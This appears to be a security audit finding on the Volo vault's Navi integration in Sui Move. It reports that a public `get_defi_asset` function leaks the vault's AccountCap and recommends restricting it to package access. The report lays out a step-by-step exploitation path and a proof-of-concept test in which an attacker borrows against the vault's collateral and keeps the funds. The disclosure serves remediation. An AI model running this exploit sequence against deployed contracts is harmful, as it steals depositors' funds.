# Audit Report

## Title
Unauthorized Borrowing via Public AccountCap Reference Exposure

## Summary
The vault's `get_defi_asset()` function publicly exposes AccountCap references without authorization checks, allowing any attacker to borrow funds from the Navi lending protocol using the vault's AccountCap. The borrowed funds are returned directly to the attacker while debt accumulates on the vault's lending account, resulting in direct fund theft.

## Finding Description

This vulnerability stems from a critical authorization bypass in the interaction between the Volo vault and Navi lending protocol integration. The vault stores a `NaviAccountCap` as a DeFi asset to manage its lending positions, but this AccountCap is publicly accessible without any authorization checks.

**Component 1: Public AccountCap Exposure Without Authorization**

The vault's `get_defi_asset` function is declared as `public` and returns an immutable reference to any stored DeFi asset without performing any authorization checks. [1](#0-0) 

This contrasts with `borrow_defi_asset`, which is properly restricted to package-only access. [2](#0-1) 

Any external caller can obtain a reference to the vault's NaviAccountCap by calling this function, as demonstrated in the legitimate adaptor usage. [3](#0-2) 

**Component 2: Public Borrow Function Without Caller Verification**

The Navi protocol's `incentive_v3::borrow_with_account_cap` function is declared as `public` and accepts an `&AccountCap` parameter without verifying that the caller has authorization to use this capability. [4](#0-3) 

The function extracts the owner address from the AccountCap and passes it to the underlying lending module, but never checks if the transaction sender is authorized to borrow on behalf of this account. [5](#0-4) 

**Component 3: Funds Flow to Caller, Debt to AccountCap Owner**

The underlying `base_borrow` function records debt against the AccountCap's owner address but returns the borrowed funds as a `Balance<CoinType>` directly to the caller. [6](#0-5) 

The debt is recorded via `logic::execute_borrow` which updates the storage for the `user` address (the vault's AccountCap owner). [7](#0-6) 

The `pool::withdraw_balance` function extracts funds from the pool and returns them to the caller. The `user` parameter is only used for event logging, not for determining who receives the funds. [8](#0-7) 

**Component 4: AccountCap Owner Assignment**

When an AccountCap is created, its `owner` field is set to the AccountCap object's own address (`object::uid_to_address(&id)`), not the creator's address. This means the vault's AccountCap represents a lending account where all borrowing debt accumulates. [9](#0-8) 

**Exploitation Path:**

1. Attacker calls `vault::get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type)` to obtain `&AccountCap`
2. Attacker calls `incentive_v3::borrow_with_account_cap<USDC>(clock, oracle, storage, pool, asset_id, amount, incentive_v2, incentive_v3, account_cap)`
3. The function borrows funds from the lending pool based on the vault's collateral
4. Debt is recorded against the vault's AccountCap owner address
5. Borrowed funds are returned as `Balance<USDC>` to the attacker
6. Attacker converts the balance to a coin and transfers it to themselves

All required parameters (Clock, PriceOracle, Storage, Pool, Incentive objects) are shared objects accessible to any caller in Sui Move.

## Impact Explanation

**Critical Severity - Direct Fund Theft:**

- Attackers can borrow funds directly from the Navi lending protocol using the vault's AccountCap, limited only by the vault's collateral and health factor constraints
- The borrowed funds are transferred directly to the attacker as a `Balance` object that they can freely convert and transfer
- The vault's lending account accumulates debt equal to the borrowed amount plus interest
- This debt must be repaid by the vault using depositor funds, creating a direct loss for all vault participants

**Vault Insolvency Risk:**

- If the unauthorized debt exceeds the vault's deposited collateral, the vault's position becomes liquidatable in the Navi protocol
- The vault's loss tolerance mechanisms cannot prevent this attack as the debt is incurred through external protocol calls, not through the vault's operation framework
- Repeated attacks can drain all available liquidity from the lending pool while imposing maximum debt on the vault

**No Viable Defense:**

The health factor check in the borrow logic only verifies that the AccountCap owner (the vault) has sufficient collateral - it does not verify caller authorization. The vault's operation framework controls are bypassed entirely since the attack uses direct external protocol calls.

## Likelihood Explanation

**Very High - Trivial to Execute:**

- Any address can call the required public functions without special capabilities or assets
- The attack requires only 2 function calls with publicly accessible shared objects
- Asset type strings are predictable (e.g., `vault_utils::parse_key<NaviAccountCap>(0)`)
- No timing constraints, race conditions, or complex setup required

**Zero Cost with Direct Profit:**

- The attacker incurs only gas fees (minimal cost)
- Direct profit equals the full borrowed amount
- No risk to the attacker as all debt is assigned to the vault
- The attack is repeatable until lending pool liquidity is exhausted or vault becomes liquidatable

**Normal Preconditions:**

- The vulnerability is exploitable whenever the vault has Navi integration enabled (standard configuration)
- The vault must have deposited collateral in Navi (part of normal yield strategy operations)

## Recommendation

**Immediate Fix:**

Change the visibility of `get_defi_asset` from `public` to `public(package)` to restrict access to only modules within the vault package:

```move
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

This aligns with the access control pattern already used for `borrow_defi_asset` and `return_defi_asset`, which are both `public(package)`.

**Alternative/Additional Fix:**

If external read access to DeFi assets is required for legitimate purposes, create a separate read-only function that returns only safe, non-capability data types, or implement explicit authorization checks before returning capability references.

## Proof of Concept

```move
#[test]
fun test_unauthorized_borrow_exploit() {
    // Setup: Create vault with Navi integration and collateral
    let mut scenario = test_scenario::begin(ADMIN);
    
    // Vault is set up with NaviAccountCap and has deposited collateral
    // (Setup code omitted for brevity)
    
    // Attacker transaction
    test_scenario::next_tx(&mut scenario, ATTACKER);
    {
        let vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        let oracle = test_scenario::take_shared<PriceOracle>(&scenario);
        let mut storage = test_scenario::take_shared<Storage>(&scenario);
        let mut pool = test_scenario::take_shared<Pool<USDC>>(&scenario);
        let mut incentive_v2 = test_scenario::take_shared<IncentiveV2>(&scenario);
        let mut incentive_v3 = test_scenario::take_shared<Incentive>(&scenario);
        
        // Step 1: Get AccountCap reference from vault (no authorization check!)
        let asset_type = vault_utils::parse_key<NaviAccountCap>(0);
        let account_cap = vault.get_defi_asset<SUI, NaviAccountCap>(asset_type);
        
        // Step 2: Borrow using vault's AccountCap
        let borrowed = incentive_v3::borrow_with_account_cap<USDC>(
            &clock,
            &oracle,
            &mut storage,
            &mut pool,
            USDC_ASSET_ID,
            1000000, // Borrow 1 USDC
            &mut incentive_v2,
            &mut incentive_v3,
            account_cap, // Using vault's AccountCap!
        );
        
        // Step 3: Convert to coin and transfer to attacker
        let stolen_coin = coin::from_balance(borrowed, test_scenario::ctx(&mut scenario));
        transfer::public_transfer(stolen_coin, ATTACKER);
        
        // Cleanup
        test_scenario::return_shared(vault);
        test_scenario::return_shared(clock);
        test_scenario::return_shared(oracle);
        test_scenario::return_shared(storage);
        test_scenario::return_shared(pool);
        test_scenario::return_shared(incentive_v2);
        test_scenario::return_shared(incentive_v3);
    };
    
    // Verify: Attacker has funds, vault has debt
    test_scenario::next_tx(&mut scenario, ATTACKER);
    {
        let attacker_coin = test_scenario::take_from_sender<Coin<USDC>>(&scenario);
        assert!(coin::value(&attacker_coin) == 1000000, 0); // Attacker received funds
        test_scenario::return_to_sender(&scenario, attacker_coin);
    };
    
    test_scenario::end(scenario);
}
```

### Citations

**File:** volo-vault/sources/volo_vault.move (L1415-1434)
```text
public(package) fun borrow_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
): AssetType {
    self.check_version();
    self.assert_enabled();

    assert!(contains_asset_type(self, asset_type), ERR_ASSET_TYPE_NOT_FOUND);

    if (self.status() == VAULT_DURING_OPERATION_STATUS) {
        self.op_value_update_record.asset_types_borrowed.push_back(asset_type);
    };

    emit(DefiAssetBorrowed {
        vault_id: self.vault_id(),
        asset_type: asset_type,
    });

    self.assets.remove<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L13-29)
```text
public fun update_navi_position_value<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    let account_cap = vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type);
    let usd_value = calculate_navi_position_value(
        account_cap.account_owner(),
        storage,
        config,
        clock,
    );

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L923-945)
```text
    public fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap,
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        let fee = get_borrow_fee(incentive_v3, amount);

        let _balance = lending::borrow_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount + fee, account_cap);

        deposit_borrow_fee(incentive_v3, &mut _balance, fee);

        _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L266-289)
```text
    fun base_borrow<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        user: address,
    ): Balance<CoinType> {
        storage::when_not_paused(storage);
        storage::version_verification(storage);

        let normal_borrow_amount = pool::normal_amount(pool, amount);
        logic::execute_borrow<CoinType>(clock, oracle, storage, asset, user, (normal_borrow_amount as u256));

        let _balance = pool::withdraw_balance(pool, amount, user);
        emit(BorrowEvent {
            reserve: asset,
            sender: user,
            amount: amount
        });

        return _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/logic.move (L127-159)
```text
    public(friend) fun execute_borrow<CoinType>(clock: &Clock, oracle: &PriceOracle, storage: &mut Storage, asset: u8, user: address, amount: u256) {
        //////////////////////////////////////////////////////////////////
        // Update borrow_index, supply_index, last_timestamp, treasury  //
        //////////////////////////////////////////////////////////////////
        update_state_of_all(clock, storage);

        validation::validate_borrow<CoinType>(storage, asset, amount);

        /////////////////////////////////////////////////////////////////////////
        // Convert balances to actual balances using the latest exchange rates //
        /////////////////////////////////////////////////////////////////////////
        increase_borrow_balance(storage, asset, user, amount);
        
        /////////////////////////////////////////////////////
        // Add the asset to the user's list of loan assets //
        /////////////////////////////////////////////////////
        if (!is_loan(storage, asset, user)) {
            storage::update_user_loans(storage, asset, user)
        };

        //////////////////////////////////
        // Checking user health factors //
        //////////////////////////////////
        let avg_ltv = calculate_avg_ltv(clock, oracle, storage, user);
        let avg_threshold = calculate_avg_threshold(clock, oracle, storage, user);
        assert!(avg_ltv > 0 && avg_threshold > 0, error::ltv_is_not_enough());
        let health_factor_in_borrow = ray_math::ray_div(avg_threshold, avg_ltv);
        let health_factor = user_health_factor(clock, storage, oracle, user);
        assert!(health_factor >= health_factor_in_borrow, error::user_is_unhealthy());

        update_interest_rate(storage, asset);
        emit_state_updated_event(storage, asset, user);
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/pool.move (L125-140)
```text
    public(friend) fun withdraw_balance<CoinType>(pool: &mut Pool<CoinType>, amount: u64, user: address): Balance<CoinType> {
        if (amount == 0) {
            let _zero = balance::zero<CoinType>();
            return _zero
        };

        let _balance = balance::split(&mut pool.balance, amount);
        emit(PoolWithdraw {
            sender: user,
            recipient: user,
            amount: amount,
            pool: type_name::into_string(type_name::get<CoinType>()),
        });

        return _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/account.move (L13-17)
```text
    public(friend) fun create_account_cap(ctx: &mut TxContext): AccountCap {
        let id = object::new(ctx);
        let owner = object::uid_to_address(&id);
        AccountCap { id, owner}
    }
```
